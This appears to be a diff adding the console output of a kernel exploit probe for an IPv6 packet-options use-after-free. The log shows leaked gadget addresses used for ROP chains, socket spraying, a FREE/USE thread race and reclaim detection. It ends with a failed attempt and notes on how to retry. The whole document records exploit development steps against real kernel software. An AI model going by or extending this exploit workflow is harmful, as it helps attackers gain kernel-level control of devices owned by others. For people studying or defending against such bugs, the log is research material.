@@ -1,0 +1,66 @@
+=== PROBE 1339a: IPV6 PKTOPTS UAF RECLAIM ===
+
+[0] install SIG_IGN for SIGSYS
+  done
+[1] fn=82CA3CB57
+  pid=283
+[1b] dynlib_get_info(593)
+  593 ok=true rv=0
+  ebase=6FF98000
+  pop_rax=1878624658 pop_rdi=1879449086 pop_rsi=1878677373 pop_rdx=1882489559 pop_rcx=1878625892 store=1879223399 jmp=1878709377
+[3] create sockets
+  master fd=22
+  spray sockets created: 125/128
+[4] TCLASS on master (allocate pktopts)
+  setsockopt(TCLASS=42) ok=true rv=0
+  TCLASS readback: 42 (expect 42)
+[5] cmsg buffer for USE thread
+  cmsg_buf=311014000  [00000014 00000029 0000003D 00000000 0000002A 00000000]
+[6] socketpairs
+  pair1: ok=true rd=148 wr=149
+  pair2: ok=true rd=150 wr=151
+[7] FREE child: mmap=311AD0000
+  building FREE chain (8192 rounds)...
+  FREE chain: 73739 entries = 589912 bytes
+[8] USE child: mmap=311CD0000
+  building USE chain (8704 rounds)...
+  USE chain: 95755 entries = 766040 bytes
+[9] spawn children
+  FREE: ok=true rv=0 tid=102013
+  USE:  ok=true rv=0 tid=102045
+
+[10] RACE: releasing both children
+  release FREE=true(1) USE=true(1)
+  FREE done=0 (expect CAFE01)  USE done=0 (expect CAFE02)
+  pid=283
+
+[11] post-race state
+  getsockopt(TCLASS) ok=true rv=0 value=0 raw=0x0 sz=4
+  → pktopts is NULL (freed + NULLed by FREE thread winning last)
+  → spray may still reclaim if dangling UMA slot available...
+
+[12] spray 125 sockets with TCLASS=187
+  spray ok=125 fail=0
+
+[13] reclaim detection
+  TCLASS after spray: 0 (0x0)  expect 187 for reclaim
+  spray_fd[1]=23 TCLASS=187
+  spray_fd[2]=24 TCLASS=187
+  spray_fd[3]=25 TCLASS=187
+  spray_fd[4]=26 TCLASS=187
+
+=== RESULTS ===
+  children: FREE=FAIL(0) USE=FAIL(0)
+  TCLASS pre-race: 42
+  TCLASS post-race: 0 (raw 0x0)
+  TCLASS after spray: 0
+
+  NO RECLAIM: pktopts was NULL after race (freed + NULLed)
+  The FREE thread's last operation won. Need USE to win last.
+  Retry with more rounds or different timing.
+
+  pid=283
+
+[15] cleanup
+=== 1339a COMPLETE ===
+=== DONE ===
